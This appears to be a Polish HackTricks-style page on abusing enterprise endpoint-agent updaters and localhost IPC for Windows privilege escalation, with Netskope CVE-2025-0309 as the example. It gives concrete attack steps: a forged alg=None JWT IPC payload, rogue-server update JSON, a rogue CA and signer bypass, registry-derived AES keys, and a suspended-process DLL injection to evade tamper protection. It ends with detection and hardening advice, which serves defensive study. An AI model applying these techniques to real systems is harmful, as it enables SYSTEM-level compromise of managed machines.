# Nadużywanie korporacyjnych Auto-Updaterów i uprzywilejowanego IPC (np. Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

Ta strona uogólnia klasę łańcuchów eskalacji uprawnień lokalnych na Windows znajdujących się w agentach końcowych i updaterach korporacyjnych, które wystawiają niskotarciową powierzchnię IPC i uprzywilejowany przepływ aktualizacji. Reprezentatywnym przykładem jest Netskope Client for Windows < R129 (CVE-2025-0309), gdzie użytkownik o niskich uprawnieniach może wymusić rejestrację na serwerze kontrolowanym przez atakującego, a następnie dostarczyć złośliwy MSI, który instaluje usługa SYSTEM.

Kluczowe pomysły, które można wykorzystać przeciw podobnym produktom:
- Wykorzystaj localhost IPC uprzywilejowanej usługi, aby wymusić ponowną rejestrację lub rekonfigurację do serwera atakującego.
- Zaimplementuj endpointy aktualizacji dostawcy, dostarcz złośliwy Trusted Root CA i skieruj updater do złośliwego, „podpisanego” pakietu.
- Obejść słabe kontrole podpisujących (CN allow‑lists), opcjonalne flagi digest i luźne właściwości MSI.
- Jeśli IPC jest „szyfrowane”, wyprowadź key/IV z identyfikatorów maszyny czytelnych dla wszystkich użytkowników przechowywanych w registry.
- Jeśli usługa ogranicza wywołujących według image path/process name, wstrzyknij do procesu znajdującego się na allow‑liście lub uruchom proces w stanie suspended i załaduj swój DLL poprzez minimalną modyfikację thread‑context.

---
## 1) Wymuszanie rejestracji na serwerze atakującego przez localhost IPC

Wiele agentów zawiera proces UI działający w trybie użytkownika, który komunikuje się z usługą SYSTEM przez localhost TCP, używając JSON.

Zaobserwowane w Netskope:
- UI: stAgentUI (niskiej integralności) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Przebieg exploitu:
1) Skomponuj token JWT do rejestracji, którego claims kontrolują host backendowy (np. AddonUrl). Użyj alg=None, żeby nie wymagać podpisu.
2) Wyślij wiadomość IPC wywołującą komendę provisioning z Twoim JWT i nazwą tenantu:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Usługa zaczyna kontaktować się z twoim złośliwym serwerem w celu rejestracji/konfiguracji, np.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Jeśli weryfikacja wywołującego jest oparta na ścieżce/nazwie, zainicjuj żądanie z poziomu pozwolonego pliku binarnego dostawcy (zob. §4).

---
## 2) Przejęcie kanału aktualizacji w celu uruchomienia kodu jako SYSTEM

Gdy klient połączy się z twoim serwerem, zaimplementuj oczekiwane endpointy i skieruj go do złośliwego MSI. Typowa sekwencja:

1) /v2/config/org/clientconfig → Zwróć konfigurację JSON z bardzo krótkim interwałem aktualizatora, np.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Zwraca certyfikat CA w formacie PEM. Usługa instaluje go w Local Machine Trusted Root store.
3) /v2/checkupdate → Dostarcza metadane wskazujące na złośliwy MSI i fałszywą wersję.

Bypassing common checks seen in the wild:
- Signer CN allow‑list: usługa może jedynie sprawdzać, czy Subject CN jest równy “netSkope Inc” lub “Netskope, Inc.”. Twój złośliwy CA może wydać leaf z tym CN i podpisać MSI.
- CERT_DIGEST property: dołącz nieszkodliwą właściwość MSI o nazwie CERT_DIGEST. Brak egzekwowania podczas instalacji.
- Optional digest enforcement: flaga konfiguracyjna (np. check_msi_digest=false) wyłącza dodatkową walidację kryptograficzną.

Wynik: usługa SYSTEM instaluje twój MSI z
C:\ProgramData\Netskope\stAgent\data\*.msi
uruchamiając dowolny kod jako NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Od R127 Netskope opakował IPC JSON w pole encryptData wyglądające jak Base64. Reverse engineering wykazał AES z kluczem/IV pochodzącymi z wartości rejestru czytelnymi przez dowolnego użytkownika:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Atakujący mogą odtworzyć szyfrowanie i wysyłać prawidłowe, zaszyfrowane polecenia z konta zwykłego użytkownika. Ogólna wskazówka: jeśli agent nagle „szyfruje” swoje IPC, szukaj device IDs, product GUIDs, install IDs pod HKLM jako materiału.

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

Niektóre usługi próbują uwierzytelnić peer poprzez rozpoznanie PID połączenia TCP i porównanie ścieżki/nazwy obrazu z allow‑listą binarek dostawcy znajdujących się w Program Files (np. stagentui.exe, bwansvc.exe, epdlp.exe).

Dwa praktyczne obejścia:
- DLL injection do procesu z allow‑listy (np. nsdiag.exe) i proxy IPC z jego wnętrza.
- Uruchomienie binarki z allow‑listy w stanie zawieszenia i bootstrapowanie swojego proxy DLL bez CreateRemoteThread (zob. §5), aby spełnić reguły wymuszane przez sterownik.

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Produkty często dostarczają sterownik minifilter/OB callbacks (np. Stadrv), który usuwa niebezpieczne prawa z uchwytów do chronionych procesów:
- Process: usuwa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: ogranicza do THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Niezawodny loader w trybie użytkownika, który respektuje te ograniczenia:
1) CreateProcess wybranej binarki dostawcy z CREATE_SUSPENDED.
2) Uzyskaj uchwyty, do których nadal masz prawo: PROCESS_VM_WRITE | PROCESS_VM_OPERATION na procesie oraz uchwyt wątku z THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (lub tylko THREAD_RESUME, jeśli łatwo patchujesz kod w znanym RIP).
3) Nadpisz ntdll!NtContinue (lub inny wczesny, gwarantowanie załadowany thunk) małym stubem, który wywołuje LoadLibraryW na ścieżce twojego DLL, a następnie wraca.
4) ResumeThread, aby wywołać stub w procesie i załadować Twój DLL.

Ponieważ nigdy nie użyłeś PROCESS_CREATE_THREAD ani PROCESS_SUSPEND_RESUME na już chronionym procesie (to ty go utworzyłeś), polityka sterownika jest spełniona.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatyzuje rogue CA, podpisywanie złośliwego MSI i serwuje potrzebne endpointy: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope to niestandardowy klient IPC, który konstruuje dowolne (opcjonalnie AES‑zaszyfrowane) komunikaty IPC i zawiera iniekcję przez zawieszony proces, aby pochodziły z binarki z allow‑listy.

---
## 7) Detection opportunities (blue team)
- Monitoruj dodatki do Local Machine Trusted Root. Sysmon + registry‑mod eventing (zob. wskazówki SpecterOps) działa dobrze.
- Oznaczaj wykonania MSI inicjowane przez usługę agenta z ścieżek typu C:\ProgramData\<vendor>\<agent>\data\*.msi.
- Przeglądaj logi agenta pod kątem nieoczekiwanych hostów/tenantów rejestracyjnych, np.: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – szukaj addonUrl / anomalie tenantów i provisioning msg 148.
- Alertuj na localhost IPC clients, które nie są oczekiwanymi signed binaries lub które pochodzą z nietypowych drzew procesów potomnych.

---
## Hardening tips for vendors
- Powiąż enrollment/update hosts z restrykcyjną allow‑listą; odrzucaj niezaufane domeny w kodzie klienta.
- Uwierzytelniaj peerów IPC przy użyciu mechanizmów OS (ALPC security, named‑pipe SIDs) zamiast sprawdzania ścieżki/nazwy obrazu.
- Trzymaj material sekretu poza world‑readable HKLM; jeśli IPC musi być szyfrowane, wyprowadzaj klucze z chronionych sekretów lub negocjuj je przez uwierzytelnione kanały.
- Traktuj updater jako powierzchnię łańcucha dostaw: wymagaj pełnego łańcucha do zaufanego CA, weryfikuj podpisy pakietów względem pinned keys i fail closed jeśli walidacja jest wyłączona w konfiguracji.

## Źródła
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
